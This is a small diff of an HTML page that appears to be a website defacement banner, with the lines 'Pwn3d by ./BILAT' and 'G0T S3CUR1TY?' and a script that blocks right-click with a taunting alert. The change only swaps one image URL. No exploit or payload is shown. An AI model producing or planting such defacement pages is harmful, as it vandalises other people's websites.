@@ -311,7 +311,7 @@ document.oncontextmenu = new Function('alert("~/ Bilat Was Here /~"); return fal
 <body>
 	<div class="wrapper">
     <div class="neil">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnSmE5AKfnSc6CsqbJRwtSHd9AwYAvOV28Gg&s" width="30%" height="20%"/>
+    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTYAxFUDFeJSCSHDgNpEvroIOkTCnt2yII_Hw&s" width="30%" height="20%"/>
 </div>
         <p id="tagline">G0T S3CUR1TY?</p>
 <div class="text">Pwn3d by ./BILAT</div><br>
